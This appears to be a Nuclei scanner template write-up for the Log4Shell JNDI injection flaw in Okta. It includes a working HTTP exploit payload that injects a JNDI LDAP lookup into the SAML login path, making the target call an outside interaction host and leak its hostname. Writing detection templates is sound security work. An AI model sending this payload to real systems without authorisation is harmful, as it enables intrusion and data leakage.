# Nuclei Template: Okta - Remote Code Execution (Apache Log4j)
**Template ID:** okta-log4j-rce
**Vulnerability Class:** Command Injection - Generic
**Severity:** Critical
**CWE:** CWE-77
**Source:** Nuclei Template (`okta-log4j-rce.yaml`)

## Vulnerability Information & PoC

## Description
Okta is susceptible to Log4j JNDI remote code execution. Okta provides cloud software that helps companies manage and secure user authentication into applications, and for developers to build identity controls into applications, website web services and devices.

## Steps to reproduce / Exploit Payload
```http
GET /login/SAML?=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/{{str}}} HTTP/1.1
Host: {{Hostname}}
```

## References
- https://sec.okta.com/articles/2021/12/log4shell
